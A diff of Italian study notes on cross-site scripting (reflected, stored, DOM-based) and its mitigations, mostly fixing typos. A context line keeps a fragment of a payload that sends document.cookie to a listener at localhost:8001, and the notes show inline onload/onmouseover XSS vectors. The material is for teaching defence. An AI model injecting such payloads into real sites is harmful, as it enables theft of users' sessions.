@@ -14,7 +14,7 @@ Esistono tre tipi di vulnerabilità XSS:
 3. **DOM-based**
 
 ### Reflected XSS
-**Assunzione**: la pagina web incorpora l'input mandato al server come parte della richiesta (l'input potrebbe contenere codice)
+**Assunzione**: la pagina web incorpora l'input mandato al server come parte della richiesta (l'input potrebbe contenere codice).
 
 1. Una **pagina malevola** con un link all'applicazione vittima (o link inviato tramite mail, i.e. _phishing_)
 2. L'utente **preme** il link
@@ -72,7 +72,6 @@ i.src="http://localhost:8001/"%2Bdocument.cookie;</script>
 **Assunzione**: l'applicazione web **memorizza** l'input inviato al server e lo mostra come parte di una pagina web (e.g. post in un forum), anche in questo caso l'input potrebbe contenere codice.
 
 Il codice malevolo è eseguito quando qualche utente visita le pagine **infette**.
-
 1. L'attaccante **memorizza** uno script malevolo nell'applicazione vittima
 2. L'utente visita la pagina della vittima ed **esegue** lo script
 3. Lo script viene eseguito nel contesto dell'applicazione vittima ed esegue il **leak** dei dati sensibili dell'utente.
@@ -122,13 +121,13 @@ Seguono esempi di una richiesta onesta ed una malevola:
 - Lunghezza propria, un set di caratteri limitati che rispettano regole regex
 - Usare delle **whitelist** quando possibile
 
-Filtrare il tag `<script>` non è abbastanza in quando javascript inline non utilizza tale tag:
+Filtrare il tag `<script>` non è abbastanza in quanto javascript inline non utilizza tale tag:
 ```html
 <body onload='alert("xss load")'>
 <a onmouseover='alert("xss over")'>Free iPhone</a>
 ```
 
-Per mitigare l'XX è consigliabile impostare la flag `HttpOnly` nei cookie per non renderli leggibili da javascript.
+Per mitigare l'XSS è consigliabile impostare la flag `HttpOnly` nei cookie per non renderli leggibili da javascript.
 
 Utilizzare la **Content Security Policy (CSP)** per specificare solo i **domini fidati**, inoltre gli script inline possono essere **disabilitati**.
 >CSP deve essere configurato server side.
